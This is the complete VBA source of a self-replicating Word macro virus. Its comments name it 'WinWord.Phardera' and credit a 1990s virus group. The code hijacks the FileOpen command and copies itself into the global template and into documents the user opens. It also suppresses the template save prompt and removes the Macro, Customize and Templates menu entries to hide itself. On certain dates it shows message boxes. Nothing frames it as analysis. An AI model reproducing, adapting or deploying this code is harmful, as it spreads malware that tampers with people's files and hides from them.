   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileOpen"

   '----------------- FileOpen macro ---------------------------

   '* WinWord.Phardera (with encrypt and stealth)
   '* Virographer by Phardera [VBB]
   '* Last Update: July 10, 96.
   '* Dedicated to Dianita DSR and All VBBers
   '* This virus was written in the city of Batavia, Indonesia.

   'If you found 'bugs' please contact me!

   Dim Macros__$()
   Dim TotalMacros

   Public Sub Main()
   Attribute Main.VB_Description = "Opens an existing document or template"
   Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.Main"
   ReDim Macros__$(2)
   TotalMacros = 0
     On Error GoTo -1: On Error GoTo Esc
     WordBasic.DisableAutoMacros 1
     InfectGlobal WordBasic.[FileName$]()

     Dim DlgFO As Object: Set DlgFO = WordBasic.DialogRecord.FileOpen(False)
     WordBasic.CurValues.FileOpen DlgFO
     WordBasic.Dialog.FileOpen DlgFO
     WordBasic.FileOpen DlgFO
     InfectDoc (DlgFO.Name)
     FuckIt

     GoTo DoneFO

   Esc:
     If Err.Number <> 102 Then
       WordBasic.FileOpen DlgFO
     End If

   DoneFO:
     Let Err.Number = 0
   End Sub

   Private Sub InfectGlobal(DocName$)
   Dim Already
   Dim i
   Dim j
     On Error GoTo -1: On Error GoTo Done1

     SetMacros
     Let Already = 0

     For i = 1 To WordBasic.CountMacros(0, 0)
       For j = 1 To TotalMacros
         If WordBasic.[MacroName$](i, 0, 0) = Macros__$(j) Then
           Let Already = -1
         End If
       Next j
     Next i

     If Not Already Then
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.ToolsOptionsGeneral RecentFiles:=0
       WordBasic.MacroCopy DocName$ + ":FileOpen", "Global:FileOpen", 1
       WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="Tools", Remove:=1
       WordBasic.ToolsCustomizeMenus Name:="ToolsCustomize", Menu:="Tools", Remove:=1
       WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="File", Remove:=1
     End If

   Done1:
     Let Err.Number = 0
   End Sub

   Private Sub InfectDoc(DocName$)
   Dim Already
   Dim i
   Dim j
     On Error GoTo -1: On Error GoTo Done2

     Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileSaveAs(False)
     WordBasic.CurValues.FileSaveAs Dlg
     If Dlg.Format = 0 Then Let Dlg.Format = 1

     If Dlg.Format = 1 Then
       SetMacros
       Let Already = 0
       For i = 1 To WordBasic.CountMacros(1, 0)
         For j = 1 To TotalMacros
           If WordBasic.[MacroName$](i, 1, 0) = Macros__$(j) Then
             Let Already = -1
           End If
         Next j
       Next i
       If Not Already Then
         WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen", 1
         WordBasic.FileSaveAs Dlg
       End If
     End If

   Done2:
     Let Err.Number = 0
   End Sub

   Private Sub SetMacros()
     Let TotalMacros = 4
     Let Macros__$(1) = "FileOpen"
     Let Macros__$(2) = "ToolsCustomizeMenus"
     Let Macros__$(3) = "ToolsOptionsSave"
     Let Macros__$(4) = "ToolsOptionsGeneral"
   End Sub

   Private Sub FuckIt()
     If WordBasic.Day(WordBasic.Now()) = 14 Then
       WordBasic.MsgBox "Dianita DSR. [I Love Her!]", "Phardera [VBB]", 64
     ElseIf WordBasic.Day(WordBasic.Now()) = 31 Then
       WordBasic.MsgBox "Phardera was here!", "Phardera [VBB]", 16
     End If
   End Sub
